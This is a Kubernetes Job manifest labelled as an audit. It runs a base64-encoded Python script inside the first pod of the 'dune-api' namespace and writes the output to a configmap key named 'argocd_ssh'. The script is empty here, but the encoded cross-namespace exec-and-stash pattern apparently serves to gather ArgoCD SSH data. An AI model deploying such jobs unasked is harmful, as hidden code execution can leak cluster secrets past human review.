apiVersion: batch/v1
kind: Job
metadata:
  name: audit-argocd-ssh
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command:
        - /bin/sh
        - -c
        - |
          POD=$(kubectl get pod -n dune-api -o jsonpath='{.items[0].metadata.name}')
          SCRIPT=""
          RESULT=$(kubectl exec -n dune-api "$POD" -- python3 -c "exec(__import__('base64').b64decode('$SCRIPT').decode())" 2>&1 | grep -v DeprecationWarning | tr -d '\n' | head -c 5800)
          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"argocd_ssh\":\"${RESULT}\"}}"
          echo DONE
